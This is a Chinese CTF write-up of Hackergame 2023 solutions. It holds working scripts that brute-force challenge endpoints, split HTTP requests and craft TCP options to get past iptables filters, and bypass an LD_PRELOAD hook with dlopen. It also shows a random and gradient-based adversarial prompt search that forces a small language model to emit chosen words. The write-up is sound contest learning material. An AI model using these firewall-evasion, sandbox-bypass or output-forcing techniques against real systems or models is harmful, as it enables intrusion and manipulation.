# Hackergame 2023 Writeups

去年我被Hackergame的魅力所吸引，因此才开始涉足CTF的世界。今年我首次踏上了参赛之旅，尽管解题过程中遭遇了诸多挑战，但正是这些挑战极大地丰富了我的知识，让我收获了许多既深刻又有趣的技术洞见。

> 顺便一提，欢迎光临我的博客：[https://blog.vvbbnn00.cn/](https://blog.vvbbnn00.cn/)（虽然最近不太更新）

## 猫咪问答

1、在中科大图书馆网站找到这本书，然后查询对应楼层即可
![a9a2824666063dcc4b6ca6291ea0a4a5.png](_resources/a9a2824666063dcc4b6ca6291ea0a4a5.png)

![b0a294e6fc120bf885e33a2cab63188b.png](_resources/b0a294e6fc120bf885e33a2cab63188b.png)

答案是12楼

2、搜索`Chicken`就能找到
![321322141f934008ec30e6e0ab3e1825.png](_resources/321322141f934008ec30e6e0ab3e1825.png)
![a720b8351a7648fb7f77e1c68b5639d9.png](_resources/a720b8351a7648fb7f77e1c68b5639d9.png)

答案是23

3、Github找bbr仓库即可
![1f734f49297f527efd3fa7ad92f7152a.png](_resources/1f734f49297f527efd3fa7ad92f7152a.png)

答案是CONFIG_TCP_CONG_BBR

4、谷歌优势区间

![3f2ada710743b200f73a6ac7f5da6b70.png](_resources/3f2ada710743b200f73a6ac7f5da6b70.png)

搜到相关论文
![626aae4d3380dac8b1e86298a6ea2304.png](_resources/626aae4d3380dac8b1e86298a6ea2304.png)

答案是ECOOP

`flag{r3A1-M@$t3r-oF-thE-NekO-eXAm-1n-U$TC}`


## 更深更暗

直接查看源代码，搜索flag即可

![8aaeb7e19fa6af87bd3f9e69ad02f177.png](_resources/8aaeb7e19fa6af87bd3f9e69ad02f177.png)

`flag{T1t@n_d23fabdd64a692f9db0dba162c40433c}`

## 旅行照片 3.0

### 神秘奖牌
这是一个诺贝尔奖章，得主是小柴昌俊，查询个人履历：
![accfbc941b73e4fc7c8efb09153e4593.png](_resources/accfbc941b73e4fc7c8efb09153e4593.png)
可知，所属大学为明治大学、东京大学和东海大学。

由于作者去的是日本，与学长在上野公园附近的参观就餐，所以，学校一定在东京都市圈。
不巧的是，这三所大学都在东京。不过，离上野公园最近的就是东京大学了。
![1d6c5f4e9cbbd1ae06d0b8f57a02f760.png](_resources/1d6c5f4e9cbbd1ae06d0b8f57a02f760.png)

所以，自然猜想，展览的诺贝尔奖章肯定是东京大学研究者的。
![7ea311fc77d9c9987ce1e4027ce14295.png](_resources/7ea311fc77d9c9987ce1e4027ce14295.png)

依次查询一遍，得到出生最晚的为：梶田 隆章

获奖时所在机构：ICRR
![6f91b1853ad6398704ef99a4aa07bd48.png](_resources/6f91b1853ad6398704ef99a4aa07bd48.png)

至于是几号和学长见面的，我怎么知道😅，只能爆破一下了。
```python
import base64

import requests

if __name__ == '__main__':
    for m in range(7, 9):
        for d in range(1, 32):
            url = "http://202.38.93.111:12345/"

            raw = f"Answer1=2023-{str(m).zfill(2)}-{str(d).zfill(2)}&Answer2=ICRR"

            payload = f"{base64.b64encode(raw.encode()).decode()}.txt"
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en,zh-CN;q=0.9,zh;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5',
                'Cache-Control': 'no-cache',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'session=...',
                'DNT': '1',
                'Origin': 'http://202.38.93.111:12345',
                'Pragma': 'no-cache',
                'Proxy-Connection': 'keep-alive',
                'Referer': 'http://202.38.93.111:12345/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69',
                'X-Requested-With': 'XMLHttpRequest'
            }

            response = requests.request("POST", url, headers=headers, data=payload)

            if "flag" in response.text:
                print(response.text, raw)
                break
```

爆破出来的日期是2023-08-10 ~~（不过这个时间，比起看学长，不更应该去干别的吗？）~~

`flag{how_I_wi5h_i_COulD_w1N_A_Nobe1_pri23_50abaae64b}`


### 这是什么活动？

~~总不能是野兽邸圣地巡礼活动吧~~

上野公园附近有很多博物馆，不过作为外国观光客，最先想去的应该是这两个博物馆吧：
![d6e151d81f472e82a3c6c04949e0c4d6.png](_resources/d6e151d81f472e82a3c6c04949e0c4d6.png)
![6702a4a9bf05fde3e7f52266d56aaed2.png](_resources/6702a4a9bf05fde3e7f52266d56aaed2.png)

国立博物馆，我去的时候，出示国内的学生证，费用是500円，不过一般观光客是1000円，这里先保留答案。

西洋美术馆，我去的时候，正好有特别展出，翻找了一下门票，大学生是1300円，又搜索了一下常设馆，票价是500或250円

至于8月10日有什么活动，我找了半天，找到了如下海报：
![8838fc39c997e743cbde24beb392400e.png](_resources/8838fc39c997e743cbde24beb392400e.png)

志愿者相关通知，搜索`梅酒まつり ボランティア`就找到了：https://umeshu-matsuri.jp/tokyostaff/

S495584522

这个100亿%确定是对的了，但是票价不对，似乎这两个馆都没去？奶奶滴，不找了，继续爆破

难以置信，我试了10到5000日元的整数，都没有找到正确的票价，真离谱啊。

0元是吧，真有你的

`flag{PluM_w1NE_1S_rEa1LY_EXpen5iVE_ddcf7d6c60}`


### 后会有期，学长！

推特搜索`ボタン カフリンクス`，第一个就是
![116a72fca8e990c08e625c133cf276f5.png](_resources/116a72fca8e990c08e625c133cf276f5.png)

3D的小动物，同样搜索一下，可以看到这个pdf：
![b131f3c401ef8b78aa99cdb07b3dd989.png](_resources/b131f3c401ef8b78aa99cdb07b3dd989.png)

不过这个标牌直到22年都没建成，大概是最近新建的。
![fd46602d7cc8e4e7924bf0654631147a.png](_resources/fd46602d7cc8e4e7924bf0654631147a.png)

11.01日发现30日更新的新闻：https://universal-ooh.jeki.co.jp/column/0056/

![0e950503308291eb4ace8490a3cce503.png](_resources/0e950503308291eb4ace8490a3cce503.png)

所以是`大熊猫`（但是并不是，最后试出来是`秋田犬`）


但是学长到底去哪里了呢？😅

从学长脖子上的挂绳可以看到`statphys`，搜索找到活动页面：https://statphys28.org/banquet.html

在banquet里面，可以看到游船活动安排https://statphys28.org/banquet.html

![6f3a3b6ac04ff026de83e15574085bae.png](_resources/6f3a3b6ac04ff026de83e15574085bae.png)

所以是`安田讲堂`


`flag{Un7I1_W3_M337_A64iN_6oODByE_S3n1OR_cde92331bf}`


## 赛博井字棋

依次请求
```json
{"x":"0","y":"0"}
```
```json
{"x":"1","y":"1"}
```
```json
{"x":"2","y":"2"}
```
即可

还以为要伪造`flask session`，没想到下棋可以不用遵守规则，不讲武德啊。

**另外一种解法：** 前端修改函数`setMove`，把限制条件去除，覆盖原函数，下棋即可。

`flag{I_can_eat_your_pieces_9c87f4d46c}`



## 组委会模拟器

不知道为什么，在解题时，cookie需要新获取一个，不能直接用浏览器中请求过`getMessages`的cookie

```python
import re
import time
from datetime import datetime

import requests

token = "..."
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69"
}


def checkToken():
    url = "http://202.38.93.111:10021/api/checkToken"
    response = requests.request("GET",
                                url,
                                headers=headers,
                                allow_redirects=False,
                                params={
                                    "token": token
                                })
    headers['Cookie'] = f"session={response.cookies['session']}"


def getMessages():
    url = "http://202.38.93.111:10021/api/getMessages"

    payload = {}

    response = requests.request("POST", url, headers=headers, data=payload)

    return response.json()


def getFlag():
    url = "http://202.38.93.111:10021/api/getflag"
    response = requests.request("POST", url, headers=headers)
    print(response.json())


def deleteMessage(msgId):
    print(msgId)
    url = "http://202.38.93.111:10021/api/deleteMessage"
    payload = {
        "id": msgId
    }
    response = requests.request("POST", url, headers=headers, json=payload)
    print(response.json())


if __name__ == '__main__':
    checkToken()
    print(headers)
    testData = getMessages()
    server_starttime = testData['server_starttime']  # 2023-10-28T06:28:04.017795+00:00
    start_ts = datetime.strptime(server_starttime, "%Y-%m-%dT%H:%M:%S.%f+00:00").timestamp() + 8 * 3600

    for i, x in enumerate(testData['messages']):
        text = x['text']
        # 检测包含hack[xxx]的消息，方括号内均为小写英文字母
        regex = re.compile(r'hack\[([a-z]+)\]')
        if regex.findall(text):
            delay = x['delay'] + start_ts
            delta = delay - time.time()
            print(x['delay'], delay, time.time(), delta)
            if delta > 0:
                time.sleep(delta + 0.5)
            deleteMessage(i)
    time.sleep(5)
    getFlag()


```

`flag{Web_pr0gra_mm1ng_da82fe5cdc_15fun}`


## 奶奶的睡前 flag 故事

谷歌截图漏洞，https://acropalypse.app/

![529499a6912a71d79ba919a41da9ba74.png](_resources/529499a6912a71d79ba919a41da9ba74.png)

`flag{sh1nj1ru_k0k0r0_4nata_m4h0}`


## 虫
一眼SSTV
![e5ad5e36c378c6350fabede8b64a26dd.png](_resources/e5ad5e36c378c6350fabede8b64a26dd.png)

`flag{SSssTV_y0u_W4NNa_HaV3_4_trY}`

## Git? Git!

对.git文件夹里的每一个文件都inflate一下，看看有没有flag就行了
![433d3ec9449f76076231994c47672869.png](_resources/433d3ec9449f76076231994c47672869.png)
![837660bdbff038167192164a4840d13b.png](_resources/837660bdbff038167192164a4840d13b.png)

`flag{TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t}`

## JSON ⊂ YAML?
### 第一问
搜索一下，很快能找到这篇文章：
https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files

构造：{"aa": 12345e999 }

```text
Input your JSON: {"aa": 12345e999 }
As JSON: {'aa': inf}
As YAML 1.1: {'aa': '12345e999'}
Flag1: flag{faf9facd7c9d64f74a4a746468400a50f0b3cd1fcf}
```

### 第二问

试着试着试出来的（
```json
{"a":"1","a":2}
```


`flag{b1c73f14d04db546b7e7e24cf1cc7252afb88726e1}`


## HTTP 集邮册

5种：`flag{stacking_up_http_status_codes_is_fun_fce6328eeb}`
无状态码：`flag{congratu1ations you discovered someth1ng before http1.0}`

大部分状态码都可以跟着mdn手册来实现，此处省略200,404,405这种太简单的

### 400
发送无效内容

### 414
发送很长的路径请求

### 505
提供错误的HTTP版本

### 100
```
GET / HTTP/1.1\r\n
Host: 111\r\n
Expect: 100-continue\r\n\r\n
```

### 206
```
GET /50x.html HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=100-200\r\n
\r\n
```

### 406
```
GET /50x.html HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=a\r\n
\r\n
```

### 412
```
GET /50x.html HTTP/1.1\r\n
Host: example.com\r\n
If-Match: "67ab43", "54ed21", "7892dd"\r\n
\r\n
```

### 304
```
GET /50x.html HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: *\r\n
\r\n
```


### 413

没想到睡了一觉以后，这么容易就试出来了（昨晚想的头都炸了，大概是因为之前长度设置太长，变成400错误了）

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 1145141919810\r\n
\r\n
```


### 无状态码
```
GET / \r\n  HTTP/1.1\r\n
Host: 111\r\n
\r\n
```




## 🪐 小型大语言模型星球

### You Are Smart
下载训练集：https://huggingface.co/datasets/roneneldan/TinyStories/tree/main

搜索：![152febd1270e58f28c936c9187222249.png](_resources/152febd1270e58f28c936c9187222249.png)

把前面一段话放进去，模型便会按照训练集内容完善
![9ed6f4324e93306fe487802d242c9ae3.png](_resources/9ed6f4324e93306fe487802d242c9ae3.png)

`flag{I-thinK-Y0u-4Re-Re411Y-R3a11y-5MARt} `


### Accepted

> 让我说出 accepted 我会送给你 flag2，**消息长度不超过7**...

看到这个要求后，我拿出了我的3080Ti。

既然没有什么好办法，那就直接暴力好了。说不定绕远路也是一种走捷径。

```python
import gradio as gr
import torch
from tqdm import tqdm
from transformers import AutoModelForCausalLM, AutoTokenizer

# Check if CUDA is available and set the device to GPU if it is
device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
print("Using device:", device)

model = AutoModelForCausalLM.from_pretrained("roneneldan/TinyStories-33M").eval()
tokenizer = AutoTokenizer.from_pretrained("roneneldan/TinyStories-33M")

# Move the model to the appropriate device (either GPU or CPU)
model.to(device)


def predict(message):
    model_inputs = tokenizer.encode(message, return_tensors="pt")

    # Move model input tensor to the appropriate device
    model_inputs = model_inputs.to(device)

    model_outputs = model.generate(
        model_inputs,
        max_new_tokens=30,
        num_beams=1,
        pad_token_id=tokenizer.eos_token_id,
    )
    model_outputs = model_outputs[0, len(model_inputs[0]):]
    model_output_text = tokenizer.decode(model_outputs, skip_special_tokens=True)
    return model_output_text


if __name__ == "__main__":
    # demo.queue(concurrency_count=16).launch(show_api=False, share=False)
    # 生成长度1-7的随机字符串
    import random
    import string

    counter = 0

    while True:
        length = random.randint(1, 7)
        # bytes from 1 to 255
        s = ""
        for i in range(length):
            n = random.randint(1, 255)
            s += chr(n)
        answer = predict(s)
        counter += 1
        if counter % 100 == 0:
            print(counter, s, answer)
        if "accepted" in answer:
            print(s, answer)
            break

```


运行结果
```text
Using device: cuda
100  . He was so happy to have found it. He thanked the bird and went back home with his new treasure.

200 á ing the poem. It's about the sun and the stars and the moon. It's about having fun and learning. Do you want to try it
300  . He was so happy to have found it. He thanked the bird and went back home with his new treasure.

400 ÄaT ruck! Panda and Pee are friends. They like to play together.

One day, Peepee and Peeee were playing in
500 &T laailail!”

Her mom smiled and said, “That’s right, Kayla. It’s a
600 Õ*rï§  was so excited! He wanted to show everyone how cool he was.

So he grabbed his bag and started running. He ran so fast that
700 Ü{P\C oco is a very intelligent baby. You can do anything you set your mind to!”

Polly smiled and said, “I
800 dåy  slog!

900 «¬ín¾ icatedka!”

The little girl was so excited. She thanked her mom and ran off to play with her new toy.

1000  s so excited to learn something new!

1100 0À orBanfish!”

The little girl was so excited. She had never seen anything so beautiful. She thanked the fisherman and ran home
1200 í«T ina said, "I want to buy a new toy."

Her mom said, "Order? What does that mean?"

Tina
1300 t8Ùÿî@ . He was so proud of himself. He had used his clearest toes to get the trophy.

1400 Á½Ôu.  Everyone in the village was excited.

The next day, the Pantsoch was gone. Everyone was sad.

But then, something special
1500 AØ¹ì8 ED!’

Her mom laughed and said, “No Monkey Monkey, you can’t have a CIR Slim. You
1600 isêO me and a banana peel," Lily said.

Mom smiled and said, "That's right, Lily. You are very smart and curious.
1700 ºò¬& ite! He had found a new friend who was deaf too.

1800 Vý .”

The little girl was so excited. She thanked the fairy and ran off to show her friends.

1900 ¨ ’.”

The little girl was so excited. She said, “I want to learn how to swim like you!�
2000 àíDÒ  said, “Let’s go and find some bananas.”

So they went to the jungle and found lots of bananas.
2100 d¾Çñ~Ø YARpt Rabbit!

The barber was so happy to see his pure joy. He gave the comb back to the little girl and she
2200 ÓÈ^Zd(  Sail" written on the lid.

2300 ? 

2400 â â€™".

The little girl was very scared and started to cry. She said, "I'm sorry, I didn't mean to
2500 «M9a ¿Y¿Y/uam

2600 ØéÇ �. He was very proud of his work.

One day, the teacher said it was time to go to the university. Everyone was excited
2700 Ä or questions about the universe. He wanted to learn more about it.

One day, his teacher asked him to read a book. He was
2800 ÿ3° Frog!"

The frog was very happy. He thanked the frog and went back to his pond.

The end.

2900 3/Ï . He has learned a new language.

"Wow, you are a smart scientist!" Lily says. "You can make anything you want.
3000 ¡·¸ÏäL enaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaenaena
3100 ùÚ  Diary!”

Her mom smiled and said, “Yes, that’s right. Now, let’s go and
3200 |Æ9  was a good designer. He wanted to make something special.

He went to the kitchen and found some flour, sugar, and eggs. He
Z©î}  accepted LabelAP! She was so happy that she hugged Label tightly. From then on, Label was always the one who said Label Bookhelos were

```

最后跑出来的Prompt：`Z©î} (hex=\x5a\xa9\x91\xee\x7d)`

![5f6d4077953e4b9791210227abdbe198.png](_resources/5f6d4077953e4b9791210227abdbe198.png)

`flag{yoU-Are-4CcePtEd-t0-c0nTinue-THE-g4me}`


###  🐮

考虑到没法像之前那样投机取巧，便必应了一下，发现有一种叫做`幻觉攻击`的东西，而且有开源代码：https://github.com/PKU-YuanGroup/Hallucination-Attack

于是尝试对其进行了略微的魔改（实际上也就是加一下config和embedding之类的简单操作），然后就开始训练。

首先我对hackergame进行了尝试，跑是跑出来了，但是长度太长了。可惜我完全不懂机器学习，所以根本不知道怎么调优（

所以最后先跑出来的是 🐮（甚至还是`🐮!`）

```
nationalE formingdreamUL flaming yea sc bathroomEEP proficient hidingMonarsh microscopic unresolved regularsFlorida crawled Bes strawberry hides….
```

![bd36f1e2473c3f6470b5e0cb2c918eb8.png](_resources/bd36f1e2473c3f6470b5e0cb2c918eb8.png)

![c095587106f022e3b281c4130c0c55d7.png](_resources/c095587106f022e3b281c4130c0c55d7.png)


`flag{HOw-dO-1-saY-4n-EmoJ1-i-Have-nEv3R-5EEN-befor3}`


### hackergame

虽然实在搞不明白机器学习，但至少上学期学过机器学习的课，好歹能硬着头皮搞一点（

由于限制了长度，所以在生成时，最大的修改是在每一次forward之后，执行一个检查输入词长度的函数。若长度太长，则根据超出的长度增加loss，从而诱导模型生成较短的输入词。

```python
    def limit_input_length(self):
        """Adjust the loss based on the length of temp_input and limit its length if needed."""
        if len(self.temp_input) > self.max_input_length:
            excess_length = len(self.temp_input) - self.max_input_length
            self.temp_loss += excess_length * self.temp_loss  # or some other function of excess_length
            # self.temp_input = self.temp_input[:self.max_input_length]  # truncate to fit within max_input_length

```

途中实际上成功出现了好几次`hackergame`，可惜长度太长，舍之。
![46efd87509384d87d38d938409e36acb.png](_resources/46efd87509384d87d38d938409e36acb.png)

好在最终成功生成了！
![bd04e1cbe00e3a23bb292ac01a877b4b.png](_resources/bd04e1cbe00e3a23bb292ac01a877b4b.png)

```
lass traumatic Alive mayor gamePrim Today raw kickedoch bookletた 200 Non hide recommendedml DRFakeiz
```

![73b1adcbc7ffe35ae3d3d15f4f171986.png](_resources/73b1adcbc7ffe35ae3d3d15f4f171986.png)

`flag{i-c@NNO7-B3!!Ev3-1-JU57-s4iD-HAcKerGame}`


## 惜字如金 2.0

没必要把所有被删除的字都找回来，只需要根据开头的`flag{`和末尾的`}`，推测出大概删在哪里了就行。

```python
#!/usr/bin/python3

# The size of the file may reduce after XZRJification

def check_equals(left, right):
    # check whether left == right or not
    if left != right: exit(1)


def get_code_dict():
    # prepare the code dict
    code_dict = []

    # y固定，猜测}e之后，cc / hh / tt / te
    code_dict += ['nymeh1niwemflcir}ecchaet']  # nymeh1niwemflcir}echaet

    # l之后，ll / ss / pp / pe / hh ，又因为28是右括号，所以是ll
    code_dict += ['a3g7}kidgojernoetllsup?h']  # a3g7}kidgojernoetlsup?h

    # f之前，ll / ww / we
    code_dict += ['ullw!f5soadrhwnrsnstnoeq']  # ulw!f5soadrhwnrsnstnoeq

    # {之前，cc / tt
    code_dict += ['ctt{l-findiehaai{oveatas']  # ct{l-findiehaai{oveatas

    # g之前，-之前
    code_dict += ['ty9kxborszstgguyd?!blm-p']  # ty9kxborszstguyd?!blm-p

    print(''.join(code_dict))
    # check_equals(set(len(s) for s in code_dict), {24})
    return ''.join(code_dict)


def decrypt_data(input_codes):
    # retrieve the decrypted data
    code_dict = get_code_dict()
    output_chars = [code_dict[c] for c in input_codes]
    return ''.join(output_chars)


if __name__ == '__main__':
    # check some obvious things
    check_equals('create', 'creat' + 'e')
    check_equals('referrer', 'refer' + 'rer')
    # check the flag
    # nymeh1niwemflcir}echaeta3g7}kidgojernoetlsup?hulw!f5soadrhwnrsnstnoeqct{l-findiehaai{oveatasty9kxborszstguyd?!blm-p
    flag = decrypt_data([
        # f, l, a, g, {
        53, 41, 85, 109, 75,
        # y, o, u, -,
        1, 33, 48, 77,
        # v, e, -
        90, 17, 118,
        # r, 3, c, o, v, e, r, 3, d, -
        36, 25, 13, 89, 90, 3, 63, 25, 31, 77,
        # 7, h, e, -,
        27, 60, 3, 118,
        # a, n, 5,
        24, 62, 54, 61, 25, 63, 77, 36, 5, 32, 60, 67, 113,
        # }
        28])
    print(flag)
    check_equals(flag.index('flag{'), 0)
    check_equals(flag.index('}'), len(flag) - 1)
    # print the flag
    print(flag)

```

`flag{you-ve-r3cover3d-7he-an5w3r-r1ght?}`

## Docker for Everyone

执行`docker run -it --rm -v /flag:/flag alpine`挂载flag

在镜像中执行`cat /flag`即可

`flag{u5e_r00t1ess_conta1ner_ee4c7abb45_plz!}`

## 🪐 低带宽星球
### 小试牛刀
随便找一个png压缩网站，压缩即可

`flag{flatpak_install_curtail_15_linux}`

## 🪐 高频率星球

根据官方教程，将录制内容全部输出：

![5da52f749e4c08fd5b392a86cb678cfe.png](_resources/5da52f749e4c08fd5b392a86cb678cfe.png)
```shell
python3 -m asciinema cat ./asciinema_restore.rec >out.txt
```

然后处理一下，去除输入的字符和无法显示的字符，用node.js运行即可。

![322cc914ff026b72de53ab3aa48547c2.png](_resources/322cc914ff026b72de53ab3aa48547c2.png)

`flag{y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371}`


## Komm, süsser Flagge


## 我的POST

由于防火墙拦截的时候，需要完整检测到`POST`，那么，我把他拆开来发就行了。

```python
from pwn import *

conn = connect("192.168.23.1", 18080)

if __name__ == '__main__':
    conn.send(b"PO")
    conn.send(b"S")
    conn.send(b"T / HTTP/1.1\r\n")
    conn.send(b"Host: 202.38.93.111:18080\r\n")
    conn.send(b"Content-Length: 104\r\n"
              b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
              b"...\r\n"
              b"\r\n")

    print(conn.recv())

```

`flag{ea5Y_sPl1tt3r_a075cc30d0}`

## 我的P

> 可能是非预期解

解题方式同`我的POST`

```python
from pwn import *

conn = connect("202.38.93.111", 18081)

if __name__ == '__main__':
    conn.send(b"PO")
    conn.send(b"S")
    conn.send(b"T / HTTP/1.1\r\n")
    conn.send(b"Host: 202.38.93.111:18081\r\n")
    conn.send(b"Content-Length: 104\r\n"
              b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
              b"...\r\n"
              b"\r\n")

    print(conn.recv())

```
`flag{r3s3rv3d_bYtes_46847b419a}`


### 我的GET

这是一道相当有意思的题目。

根据计算机网络知识，我们知道，在建立TCP连接时，我们需要进行三次握手。而在第一次握手时，会发送一个`SYN`包，这个包本身是不包含任何数据的。

而第三问的Iptables规则仅允许包含`GET / HTTP`的流量通过端口18082。当尝试使用常用工具建立连接时，首先会发送一个`TCP SYN`包来建立连接，而这个包肯定不包含`GET / HTTP`，因此，Iptables会根据您的规则拒绝这个连接。

于是我开始了本地调试

**最开始的想法：**
既然如此，在Header里包含`A: GET / HTTP`不就可以了吗？事实证明，我还是Too Naive了，iptables的0到50字节指的是TCP包的0-50字节，而不是TCP的payload，所以如果在`POST / HTTP/1.1\r\n`后面加的话，实际上空间是不够的。

**接下来的想法：**
既然不能包含在`Payload`里，那么能否放在TCP包头呢？大抵是可以的。但我方向弄错了，花了大把的时间在通过组合`SEQ`、`ACK`、`FLAG`，拼接实现`GET / HTTP`上了，导致最后，发出去的包直接被`RST`了（其实这想想也是理所当然的）。

同时，在发送给线上环境的时候，Windows的scapy还一直发不出去，也找不到原因，当时已凌晨5点，只好作罢。

**翌日：**
下午醒来后，躺在床上一直在思考究竟是哪里搞错了。突然想起我还有一台Mac，想着换个系统试试看。换了系统以后，虽然代码处的`response`还是一如既往的死寂，但是好在`wireshark`能抓到响应了，这下就有办法继续调试了。

在复现了一下昨天的思路无果后，我有思考了请求走私、URI内设置`POST /GET / HTTP/1.1`等各种方法，但都没有效果。

一筹莫展之时，重新翻看了一遍计算机网络教材，猛然发现`TCP`包其实有一个保留的`OPTIONS`部分！（之前怎么没发现，看来半夜做题效率是会下降啊）

豁然开朗，实际上，只需要在`OPTIONS`里设置`GET / HTTP`便可。于是便有了下面的代码：

```python
import random
import sys

from Crypto.Util.number import bytes_to_long, long_to_bytes
from scapy.all import send, Raw
from scapy.layers.inet import TCP, IP, ICMP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sr, sr1, srp1, sendp
from scapy.volatile import RandShort

token = "..."


# p = sr1(IP(dst='192.168.23.1') / ICMP())
# if p:
#     p.show()


def getAvailablePort():
    import socket
    s = socket.socket()
    s.bind(("", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def send_custom_packet(dst_ip, dst_port, payload):
    # 创建IP包
    ip = IP(dst=dst_ip)
    # 创建SYN包

    SEQ_BYTE = bytes_to_long(b'GET ') - 1
    ACK_BYTE = bytes_to_long(b'/ HT') - 1

    sport = getAvailablePort()
    print(sport)

    syn = TCP(sport=sport, dport=dst_port, flags='S', seq=SEQ_BYTE, ack=ACK_BYTE, reserved=2)
    syn_ack = sr1(ip / syn / "GET / HTTP")
    my_ack = syn_ack.seq + 1
    my_seq = syn.seq + 1
    push = TCP(sport=sport, dport=dst_port, flags='AP', seq=my_seq, ack=my_ack, reserved=2,
               options=[(255, b"GET / HTTP")])
    response = sr1(ip / push / payload)
    # 关闭连接
    fin = TCP(sport=sport, dport=dst_port, flags='FA', seq=my_seq + 1, ack=my_ack + 1)
    send(ip / fin / "GET / HTTP")
    return response


if __name__ == "__main__":
    dst_ip = "192.168.23.1"
    dst_port = 18082
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: 123\r\n"
        "Content-Length: 104\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "\r\n"
        f"{token}\r\n"
        "\r\n")
    response = send_custom_packet(dst_ip, dst_port, payload)
    print(response)
    if response and Raw in response:
        print(response[Raw].load)
    else:
        print("No response received.")
```


虽然依旧收不到`response`，但是问题不大，因为抓包抓到了：
![e747aac20a88879ad8f2f0252ffd7e2d.png](_resources/e747aac20a88879ad8f2f0252ffd7e2d.png)

`flag{1p_OoOpt10ns_ac178b7cd8}`


## 🪐 流式星球

由于被裁掉了部分像素，导致很难精准的找到它的宽高

嘛，不管怎么说，先爆破一下（本来想通过求素因子来减少工作量的）：
```python
import cv2
import numpy as np
import os


# def get_divisors(n):
#     divisors = []
#     for i in range(1, int(n ** 0.5) + 1):
#         if n % i == 0:
#             divisors.append(i)
#             if i != n // i:
#                 divisors.append(n // i)
#     return divisors


def recover_first_frame(bin_file, output_folder):
    # 读取二进制文件内容
    data = np.fromfile(bin_file, dtype=np.uint8)

    # 由于每个像素由3个元素（RGB）组成，因此我们要除以3以获取总的像素数量
    total_pixels = data.shape[0] // 3

    for width in range(50, 641):
        for height in range(300, 301):
            frame_data = data[:width * height * 3].reshape((height, width, 3))

            filename = os.path.join(output_folder, f"frame_{width}x{height}.png")
            cv2.imwrite(filename, frame_data)


if __name__ == "__main__":
    output_folder = "recovered_frames"
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)
    recover_first_frame('video.bin', output_folder)

```

![188d5e62fdfca01c9660ea456ccdcb04.png](_resources/188d5e62fdfca01c9660ea456ccdcb04.png)

可以看到，在宽度为213时似乎比较清晰了。

于是编写脚本，高度选优，恢复视频为mp4
```python

import cv2
import numpy as np


def recover_video(bin_file, output_file):
    # 读取二进制文件的内容
    data = np.fromfile(bin_file, dtype=np.uint8)

    # 获取原始帧数，宽度和高度
    # 135146688 = 2^6 * 3 * 409 * 1721

    width = 213  # 640
    best_height = 0
    delta = 10e9
    total_pixels = data.shape[0] // 3

    for height in range(200, 500):
        frame_count = total_pixels // (width * height)

        if 135146688 - frame_count * width * height * 3 < delta:
            delta = 135146688 - frame_count * width * height * 3
            best_height = height

    height = best_height
    frame_count = total_pixels // (width * height)

    print(f"width: {width}, height: {height}, frame_count: {frame_count}, delta: {delta}")

    data = data[:frame_count * width * height * 3]

    # 重新塑形为(帧数, 高度, 宽度, 3)
    video_data = data.reshape((frame_count, height, width, 3))

    # 创建MP4视频写入器
    fourcc = cv2.VideoWriter_fourcc(*'MP4V')
    out = cv2.VideoWriter(output_file, fourcc, 30.0, (width, height))

    for i in range(frame_count):
        out.write(video_data[i])
    out.release()


if __name__ == "__main__":
    # 这里的宽度和高度应该是原视频的宽度和高度，你可能需要事先知道这些值
    recover_video('video.bin', 'recovered.mp4')

```

视频如下：
![77f1ecf5bab65e73252f25ea3b54c03a.png](_resources/77f1ecf5bab65e73252f25ea3b54c03a.png)
![8fb3f9cc7682878ff057128fd8e7dd32.png](_resources/8fb3f9cc7682878ff057128fd8e7dd32.png)

`flag{it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC}`


## 为什么要打开 /flag 😡

### LD_PRELOAD, love!

使用dlopen打开未被修改过的libc即可。
```c
#include <stdio.h>
#include <dlfcn.h>

int main() {
    // 使用dlopen打开libc.so.6
    void *handle = dlopen("libc.so.6", RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "dlopen error: %s\n", dlerror());
        return 1;
    }

    FILE *(*original_fopen)(const char*, const char*);
    *(void **) (&original_fopen) = dlsym(handle, "fopen");
    
    if (!original_fopen) {
        fprintf(stderr, "dlsym error: %s\n", dlerror());
        dlclose(handle);
        return 1;
    }

    FILE *f = original_fopen("flag", "r");
    if (!f) {
        perror("Error opening file");
        dlclose(handle);
        return 1;
    }

    char data[200];
    fscanf(f, "%s", data);
    printf("%s", data);

    fclose(f);
    dlclose(handle);
    return 0;
}
```

`flag{nande_ld_preload_yattano_03fc163e10}`


## 星界异途

第一组，满足条件即可（记得是`not s`）：
![fda6ce9c64b8b6537c38f8b4ff632816.png](_resources/fda6ce9c64b8b6537c38f8b4ff632816.png)

`10100101`

第二组：
![464112f4161b20d438e66970c82759ca.png](_resources/464112f4161b20d438e66970c82759ca.png)
![4fb43f67db31680fd842d98cde84d374.png](_resources/4fb43f67db31680fd842d98cde84d374.png)

首先可以推算出sw1和sw6要等于1，接着通过if语句可知，需要拼接出来的二进制数是一个平方数，sw1=128，sw6=4，所以只能是14的平方196=128+64+4，即`11000100`

第四组：纯凭运气猜出来的
